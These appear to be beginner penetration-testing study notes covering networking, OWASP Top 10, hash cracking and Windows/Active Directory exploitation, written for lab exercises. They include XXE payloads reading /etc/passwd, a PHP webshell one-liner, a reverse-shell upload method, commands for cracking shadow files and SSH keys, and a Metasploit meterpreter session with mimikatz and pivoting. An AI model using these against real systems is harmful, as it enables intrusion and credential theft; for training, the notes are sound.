# Complete Beginner

1. [Network Exploitation Basics](#network-exploitation-basics)
2. [Web Hacking Fundamentals](#web-hacking-fundamentals)
3. [Cryptography](#cryptography)
4. [Windows Exploitation Basics](#windows-exploitation-basics)

## Network Exploitation Basics

---

* OSI Model layers - Application, Presentation, Session, Transport, Network, Data Link, Physical.

* TCP/IP Model layers - Application, Transport, Internet, Network Interface.

* Common Networking commands - ```ping```, ```traceroute```, ```whois```, ```dig```.

* ```nmap``` can be used to scan networks.

* Network services can be enumerated and exploited using various tools such as ```nmap``` (for preliminary scan), ```enum4linux``` (enumeration) and ```metasploit``` (exploitation).

## Web Hacking Fundamentals

---

* Making HTTP requests using ```cURL```:

  ```shell
  curl https://10.10.80.227:8081
  #performs GET requests by default and retrieves page

  curl -X POST https://10.10.80.227:8081
  #-X to specify request type
  ```

* OWASP Top 10:

  1. Injection:

     * Occurs because user input is interpreted as actual command.

     * Injection attacks can be prevented by using an allow list or stripping input.

     * Command injection - server-side code in web app makes system call on host machine; executes OS commands on server.

     * Detect active command injection - occurs when response from system call is seen; in PHP, ```passthru()``` can lead to active command injection, for example.

     * We can try commands such as ```whoami```, ```id```, ```ifconfig```, ```uname -a``` for Linux or ```whoami```, ```ver```, ```ipconfig```, ```netstat -an``` for Windows.

  2. Broken Authentication:

     * Due to flaws in authentication mechanism; examples include brute force attacks and weak session cookies.

     * Mitigation techniques include using a strong password policy, automatic lockout after n attempts, and implementing MFA.

  3. Sensitive Data Exposure:

     * Occurs when a webapp accidentally reveals sensitive data.

      ```shell
      #example scenario of getting a .db file (flat-file database)

      file example.db
      #shows that it is an sqlite db

      sqlite3 example.db
      #check the file

      .tables #check tables

      PRAGMA table_info(users); #check 'users' table info

      SELECT * FROM users; #dump 'users' data
      #crack hashed passwords
      ```

  4. XML External Entity:

     * Vulnerability that abuses features of XML parsers, data; allows attacker to interact with backend of app, and can allow attacker to read files, cause DoS or SSRF attacks.

     * Two types of XXE attacks - in-band XXE and out-of-band XXE (blind XXE).

     * Examples of XXE payloads:

      ```xml
      <!DOCTYPE replace [<!ENTITY name "feast"> ]>
         <userInfo>
            <firstName>falcon</firstName>
            <lastName>&name;</lastName>
         </userInfo>
      <!--ENTITY called name as "feast", used in code-->
      ```

      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE root [<!ENTITY read SYSTEM 'file///etc/passwd'>]>
      <root>&read;</root>
      <!--website vulnerable to XXE would display contents of '/etc/passwd'-->
      ```

  5. Broken Access Control:

     * If website visitor is able to access protected pages in unauthorised manner, the access controls are broken.

     * IDOR (Insecure Direct Object Reference), is exploiting a misconfiguration related to user input, to access resources which require a higher privilege. It is an access control vulnerability.

     * For example, <https://example.com/bank?account=1234> can be modified by replacing the bank account number, and if site is misconfigured, it can result in IDOR.

  6. Security Misconfiguration:

     * Includes poorly configured permissions, having unnecessary features enabled, default accounts with unchanged passwords and overly detailed error messages.

  7. Cross-site Scripting:

     * XSS is a type of injection, allowing attacker to execute malicious scripts on victim machine.

     * Webapps are vulnerable to XSS if it uses unsanitized user input.

     * Three types of XSS are:

       * Stored XSS - malicious string originates from website's database.

       * Reflected XSS - payload is part of victim's request to website.

       * DOM-based XSS - webpage document can be displayed in browser or as code.

     * Common XSS payloads include pop-ups, HTML overriding, port scanning, etc.

  8. Insecure Deserialization:

     * Occurs when untrusted data is used to abuse app logic; it leverages legit serialization and deserialization process used by webapps.

     * Serialization is the process of converting programming objects into compatible formatting for further processing. Deserialization is converting serialized info into their complex form.

  9. Components with Known Vulnerabilities:

     * Occurs when a program is being used which already has a well-documented vulnerability.

  10. Insufficient Logging and Monitoring:

      * In webapps, every action performed by user should be logged in order to trace actions in the event of an incident.

      * Logs can store info such as HTTP status codes, timestamps, usernames, page locations and IP addresses.

* Upload vulnerabilities:

  * Overwriting existing files - if files are uploaded with the same name as files on the website, and there are no checks being conducted, there is a chance that we can overwrite the existing files.

  * Remote code execution -

    * Webshells -

      ```shell
      gobuster dir -u http://demo.uploadvulns.thm -w /usr/share/wordlists/directory-list.txt
      #scan website directories using gobuster
      #check for directories where files can be uploaded
      #if found, try to upload files like images

      #if the upload works, we can attempt to upload webshells
      #the webshell should be in the same language as the backend of the website
      #an example of a basic PHP webshell if <?php echo system($_GET["cmd"]);?>
      #this can let us execute commands
      ```

    * Reverse shells -

      ```shell
      #similar process to uploading a webshell
      #we can use any reverse shell, and change the IP address and port

      nc -nvlp 1234
      #attacker machine listening on port 1234
      #once shell has been uploaded, navigate to that directory
      #this will give us RCE from our shell
      ```

  * Bypassing client-side filtering - this would require intercepting using Burp Suite and modifying the incoming page to remove the functions that filter the files using MIME types (or other filters), and then upload the reverse shell.

  * Bypassing server-side filtering - if the server-side code checks for file extensions and blacklists ```.php``` extensions, we can try alternatives such as naming the file with the extension ```.png.php``` so as to attempt to bypass the filter. If this does not work, we can also tweak the magic numbers (file signatures) of the file being uploaded; ```hexeditor``` can be used to edit in this way.

  * Methodology:

    1. Go through website, look at headers
    2. Inspect website through source-code for client-side filters
    3. Use ```gobuster``` with ```-x``` switch to find directories with particular extensions
    4. Upload any file and check if it gets uploaded
    5. Attempt malicious file upload

## Cryptography

---

* Terminology:

  * Plaintext - data before encryption or hashing.
  * Encoding - form of data representation, immediately reversible.
  * Hash - output of hash function.
  * Use of hashing - verify integrity of data; verify passwords.
  * Hash collision - when 2 different inputs give the same output.
  * Brute force - attacking cryptography by trying every different password or key.
  * Cryptanalysis - attacking cryptography by finding a weakness in underlying maths.
  * Rainbow table - lookup table of hashes to plaintexts.
  * Ciphertext - encrypted plaintext.
  * Cipher - method of encrypting/decrypting data; could be cryptographic or non-cryptographic.
  * Encryption - transforming data into ciphertext using cipher.
  * Key - information required to decrypt ciphertext and get plaintext.
  * Passphrase - password used to protect key.
  * Asymmetric encryption - uses different keys to encrypt/decrypt.
  * Symmetric encryption - uses same keys to encrypt/decrypt.

* To protect against rainbow tables, add salt to the passwords.

* Online tools for help:

  * [CrackStation](https://crackstation.net/)
  * [Hash Examples](https://hashcat.net/wiki/doku.php?id=example_hashes)
  * [Hash Identifier](https://hashes.com/en/tools/hash_identifier)

* Hash cracking:

  ```shell
  #using hashcat
  #first try to get type of hash
  #for example, bcrypt
  hashcat -h #help

  hashcat -h | grep bcrypt #gives reference value 3200

  hashcat -m 3200 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt
  #-m for reference value, '-a 0' for dictionary attack mode
  #hash1.txt contains the hash to be cracked

  #use -a 3 if -a 0 does not work
  ```

  ```shell
  #using john
  man john

  john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt

  #to show passwords after cracking
  john hash1.txt --show
  ```

* John The Ripper:

  ```shell
  john --help

  #automatic cracking
  john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt

  #to identify format, we can use online tools or hash-identifier
  wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
  python3 hash-id.py #enter hash value

  #format-specific cracking
  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
  #use -raw prefix in formats if standard, non-salted

  #check all supported formats
  john --list=formats
  ```

  ```shell
  #authentication hashes - hashed passwords stored by OS, might need brute force
  #for ntlm hashes, use --format=NT

  #cracking hashes from /etc/shadow
  unshadow /etc/passwd /etc/shadow > unshadowed.txt
  #unshadow combines files from /etc/passwd and /etc/shadow; use path of file with contents
  #unshadowed.txt stores the user:password hash

  #to crack unshadowed.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
  ```

  ```shell
  #single crack mode - word mangling the usernames
  john --single --format=raw-sha256 hashes.txt
  #here, hashes.txt has to follow the format of username:hash

  #john also supports creation of custom rules with regex
  ```

  ```shell
  #crack protected zip files
  #use zip2john to convert zip to hash format
  zip2john zipfile.zip > ziphash.txt

  john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt

  #similarly, we can crack protected rar files using rar2john
  rar2john rarfile.rar > rarhash.txt

  john --wordlist=/usr/share/wordlists/rockyou.txt rarhash.txt
  ```

  ```shell
  #john can be used to crack ssh key passwords as well
  ssh2john id_rsa > id_rsa_hash.txt
  #if ssh2john is not installed, we can use this as well
  python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt

  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
  ```

* Encryption:

  * Symmetric encryption - same key to encrypt/decrypt data; faster algorithms, smaller keys. Examples are DES (broken) and AES.

  * Asymmetric encryption - different keys to encrypt/decrypt data (public and private key); slower algorithms, larger keys. Examples include RSA and Elliptic Curve Cryptography. Data encrypted with private key can be decrypted with public key, and vice-versa.

  * Tools and guides to break RSA encryption:

    * [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
    * [rsatool](https://github.com/ius/rsatool)
    * [RSA Explainer](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/)

  * In CTFs, key variables in RSA are:

    ```markdown
    p,q - large prime numbers
    n - product of p and q
    (n,e) - public key
    (n,d) - private key
    m - message (plaintext)
    c - ciphertext (encrypted text)
    ```

## Windows Exploitation Basics

---

* To check and set files' or folders' permissions in Windows, ```icacls``` tool can be used.

* Types of Active Directory:

  * On-premise Active Directory (AD) - Authentication uses following protocols:

    * NTLM
    * LDAP/LDAPS
    * KERBEROS

  * Azure Active Directory (AAD) - Authentication uses following methods:

    * SAML
    * OAUTH 2.0
    * OpenID Connect

* Active Directory - directory service for Windows Domain Networks; collection of machines and servers connected inside of domains, that make up the AD network. Some of its components include:

  * Domain controllers - Windows server that has Active Directory Domain Services (AD DS) installed, to control the domain.

  * Forest - collection of domain trees inside of AD network; to categorize the parts of network as a whole.

  * AD DS - core functions of an AD network; allow for management of domain, security certificates, LDAPs (Lightweight Directory Access Protocols), etc.

* [CheatSheet for Powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993) in Active Directory:

  ```shell
  Get-NetComputer -fulldata | select operatingsystem
  #get list of all OS on domain

  Get-NetUser | select cn
  #get list of all users on domain

  Get-NetGroup -GroupName *
  #list of all groups

  Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
  #details of particular user
  ```

* Metasploit to exploit machines:

  ```shell
  msfdb init #initialize database

  msfconsole

  db_status #check if db connected

  db_nmap -sV 10.10.91.69 #scan machine and feed results into db
  #identify vulnerable services and their ports

  hosts #view info about hosts from db

  services #info about services from db

  vulns #info about discovered vulnerabilities

  search multi/handler #search exploit

  use 5 exploit/multi/handler #can also use only number, to use module

  set PAYLOAD windows/meterpreter/reverse_tcp #set payload

  set LHOST 10.17.48.136 #set own IP as lhost

  use icecast #switch to use different module, works if the string is unique

  set RHOSTS 10.10.91.69

  exploit #run module
  #alternatively, we can do 'run -j' to run this as a job

  jobs #check jobs

  sessions #check sessions

  sessions -i 1 #interact with session 1

  #after getting shell
  ps #to check running processes

  help #view commands

  sysinfo #get info about system

  load kiwi #load new version of mimikatz

  getprivs #enable all privileges available to current user

  ipconfig #view network info of target system

  run post/windows/gather/checkvm #POST module to check if we are in VM

  run post/multi/recon/local_exploit_suggester #checks for exploits which can be run in session to elevate privileges

  run post/windows/manage/enable_rdp #try forcing rdp to be enable

  shell #spawn normal system shell

  run autoroute -h #help menu for autoroute

  run autoroute -s 172.18.1.0 -n 255.255.255.0 #add a route to the subnet

  background #backgrounds currrent session
  ```

---
